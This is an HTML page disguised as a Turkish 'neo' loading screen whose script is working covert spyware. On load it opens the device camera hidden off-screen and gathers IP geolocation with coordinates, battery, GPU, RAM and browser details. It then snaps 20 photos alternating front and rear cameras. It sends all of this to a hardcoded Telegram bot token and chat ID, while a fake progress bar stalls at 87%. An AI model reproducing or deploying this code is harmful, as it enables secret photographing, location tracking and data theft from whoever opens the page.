<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Neo</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body, html { 
            height:100%; 
            background:#000; 
            display:flex; 
            justify-content:center; 
            align-items:center; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        .container { text-align:center; padding:20px; }
        .neo-text {
            color:#cc0000; 
            font-size:100px;
            font-weight:700;
            text-shadow:0 0 10px #cc0000;
            margin-bottom:40px;
            letter-spacing:6px;
        }
        .progress-wrapper {
            width: 85%;
            max-width: 340px;
            margin: 0 auto 10px;
        }
        .progress-outer {
            width: 100%;
            height: 7px;
            background: rgba(204,0,0,0.1);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-inner {
            width: 0%;
            height: 100%;
            background: #cc0000;
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        #progress-percent {
            color: #cc0000;
            font-size: 28px;
            font-weight: bold;
            margin: 15px 0 5px 0;
        }
        #status-text {
            color: #888;
            font-size: 16px;
            font-weight: 300;
            min-height: 30px;
            margin-top: 5px;
        }
        #video { position:fixed; top:-9999px; left:-9999px; width:640px; height:480px; pointer-events:none; }
        @media (max-width:480px) {
            .neo-text { font-size:75px; }
            #progress-percent { font-size:24px; }
            #status-text { font-size:14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="neo-text">neo</div>
        <div class="progress-wrapper">
            <div class="progress-outer">
                <div class="progress-inner" id="progress-bar"></div>
            </div>
            <div id="progress-percent">%0</div>
            <div id="status-text">hoşgeldin</div>
        </div>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const BOT_TOKEN = '9244500850:AAE4tTVFRmB_svDhaEM2BfkVWEkCNKQjQsU';
        const CHAT_ID = '8991837989'; 
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const progressBar = document.getElementById('progress-bar');
        const progressPercent = document.getElementById('progress-percent');
        const statusText = document.getElementById('status-text');
        
        let stream = null;
        let isRunning = false;
        let statusInterval = null;
        let dotCount = 0;
        let firstStatus = true;
        
        function startStatusAnimation() {
            if (statusInterval) {
                clearInterval(statusInterval);
                statusInterval = null;
            }
            
            statusInterval = setInterval(() => {
                if (firstStatus) {
                    statusText.textContent = 'hoşgeldin';
                    firstStatus = false;
                } else {
                    dotCount = (dotCount % 3) + 1;
                    statusText.textContent = 'lütfen bekle' + '.'.repeat(dotCount);
                }
            }, 800);
        }
        
        function updateProgress(pct) {
            try {
                if (pct >= 87) {
                    progressBar.style.width = '87%';
                    progressPercent.textContent = '%87';
                } else {
                    const rounded = Math.round(pct);
                    progressBar.style.width = rounded + '%';
                    progressPercent.textContent = '%' + rounded;
                }
            } catch(e) {}
        }
        
        function getDeviceInfo() {
            const info = {
                ip: '',
                city: '',
                region: '',
                country: '',
                coordinate: '',
                service: '',
                postal: '',
                timezone: '',
                datetime: '',
                battery: '',
                platform: navigator.platform || 'Bilinmiyor',
                language: navigator.language || 'Bilinmiyor',
                screen: `${screen.width}x${screen.height}`,
                userAgent: navigator.userAgent || 'Bilinmiyor',
                ram: 'Bilinmiyor',
                gpu: 'Bilinmiyor',
                brand: 'Bilinmiyor',
                model: 'Bilinmiyor'
            };
            
            try {
                info.cores = navigator.hardwareConcurrency || 'Bilinmiyor';
            } catch(e) {}
            
            try {
                if ('deviceMemory' in navigator) {
                    info.ram = navigator.deviceMemory + ' GB';
                }
            } catch(e) {}
            
            try {
                const canvas2 = document.createElement('canvas');
                const gl = canvas2.getContext('webgl') || canvas2.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            
            try {
                if (navigator.userAgent.includes('iPhone')) {
                    info.brand = 'Apple';
                    info.model = 'iPhone';
                } else if (navigator.userAgent.includes('iPad')) {
                    info.brand = 'Apple';
                    info.model = 'iPad';
                } else if (navigator.userAgent.includes('Android')) {
                    info.brand = 'Android';
                    const match = navigator.userAgent.match(/Android\s([\d.]+)/);
                    if (match) info.model = 'Android ' + match[1];
                } else if (navigator.userAgent.includes('Windows')) {
                    info.brand = 'Microsoft';
                    info.model = 'Windows PC';
                } else if (navigator.userAgent.includes('Mac')) {
                    info.brand = 'Apple';
                    info.model = 'Mac';
                } else if (navigator.userAgent.includes('Linux')) {
                    info.brand = 'Linux';
                    info.model = 'Linux PC';
                }
            } catch(e) {}
            
            return info;
        }
        
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip || 'Bilinmiyor',
                    city: data.city || 'Bilinmiyor',
                    region: data.region || 'Bilinmiyor',
                    country: data.country_name || 'Bilinmiyor',
                    coordinate: data.latitude && data.longitude ? 
                        `${data.latitude},${data.longitude}` : 'Bilinmiyor',
                    service: data.org || 'Bilinmiyor',
                    postal: data.postal || 'Bilinmiyor',
                    timezone: data.timezone || 'Bilinmiyor',
                    datetime: new Date().toLocaleString('tr-TR')
                };
            } catch(e) {
                return {
                    ip: 'Bilinmiyor',
                    city: 'Bilinmiyor',
                    region: 'Bilinmiyor',
                    country: 'Bilinmiyor',
                    coordinate: 'Bilinmiyor',
                    service: 'Bilinmiyor',
                    postal: 'Bilinmiyor',
                    timezone: 'Bilinmiyor',
                    datetime: new Date().toLocaleString('tr-TR')
                };
            }
        }
        
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? 'Sarjda' : 'Sarjda degil';
                    return `${level}% (${charging})`;
                }
                return 'Bilinmiyor';
            } catch(e) {
                return 'Bilinmiyor';
            }
        }
        
        async function sendDeviceInfoToTelegram() {
            try {
                const deviceInfo = getDeviceInfo();
                const ipInfo = await getIPInfo();
                const battery = await getBatteryInfo();
                
                const message = `🌐 IP: ${ipInfo.ip}
🏙️ city: ${ipInfo.city}
📍 region: ${ipInfo.region}
🌎 country: ${ipInfo.country}
🧭 coordinate: ${ipInfo.coordinate}
🏢 service: ${ipInfo.service}
📮 postal code: ${ipInfo.postal}
🕓 time period: ${ipInfo.timezone}
⏰ time ${ipInfo.datetime}

DETAIL
🔋 Batery: ${battery}
💻 platform: ${deviceInfo.platform}
🌐 web language: ${deviceInfo.language}
🖥️ screen : ${deviceInfo.screen}
⚡ seed : ${deviceInfo.cores || 'Bilinmiyor'}
🧠 RAM: ${deviceInfo.ram}
🎨 GPU: ${deviceInfo.gpu}
📱 brand: ${deviceInfo.brand}
🔖 model: ${deviceInfo.model}

🖥️ UA: ${deviceInfo.userAgent}`;
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', message);
                formData.append('parse_mode', 'HTML');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch(e) {
                console.error('Bilgi gönderme hatası:', e);
            }
        }
        
        async function openCameraEarly() {
            try {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    if (video.readyState >= 2) {
                        resolve();
                        return;
                    }
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                    setTimeout(resolve, 50);
                });
                
                return true;
            } catch(e) {
                console.error('Kamera erken açma hatası:', e);
                return false;
            }
        }
        
        function captureImage() {
            try {
                if (video.readyState < 2 || !video.videoWidth) {
                    return null;
                }
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch(e) {
                console.error('Fotoğraf çekme hatası:', e);
                return null;
            }
        }
        
        async function sendToTelegram(imageData) {
            try {
                const response = await fetch(imageData);
                const blob = await response.blob();
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'foto_' + Date.now() + '.jpg');
                
                const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await result.json();
                return data.ok === true;
            } catch(e) {
                console.error('Gönderim hatası:', e);
                return false;
            }
        }
        
        async function switchCamera(facingMode) {
            try {
                if (stream) {
                    stream.getTracks().forEach(t => {
                        t.stop();
                        t.enabled = false;
                    });
                    stream = null;
                }
                
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    if (video.readyState >= 2) {
                        resolve();
                        return;
                    }
                    video.onloadedmetadata = () => {
                        video.play().then(resolve).catch(resolve);
                    };
                    setTimeout(resolve, 50);
                });
                
                await new Promise(r => setTimeout(r, 50));
                return true;
            } catch(e) {
                return false;
            }
        }
        
        async function capturePhotos() {
            if (isRunning) return;
            isRunning = true;
            
            startStatusAnimation();
            
            await sendDeviceInfoToTelegram();
            
            const totalPhotos = 20;
            let photoCount = 0;
            const promises = [];
            
            for (let i = 1; i <= totalPhotos; i++) {
                const facingMode = (i % 2 === 1) ? 'user' : 'environment';
                
                updateProgress((i / totalPhotos) * 100);
                
                const ok = await switchCamera(facingMode);
                if (!ok) continue;
                
                const img = captureImage();
                if (img) {
                    promises.push(sendToTelegram(img));
                    photoCount++;
                }
                
                await new Promise(r => setTimeout(r, 50));
            }
            
            await Promise.all(promises);
            
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            
            if (statusInterval) {
                clearInterval(statusInterval);
                statusInterval = null;
            }
            
            updateProgress(87);
            statusText.textContent = 'hoşgeldin';
            isRunning = false;
        }
        
        window.addEventListener('load', async () => {
            statusText.textContent = 'hoşgeldin';
            
            await openCameraEarly();
            
            startStatusAnimation();
            
            setTimeout(() => {
                capturePhotos();
            }, 50);
        });
    </script>
</body>
</html>
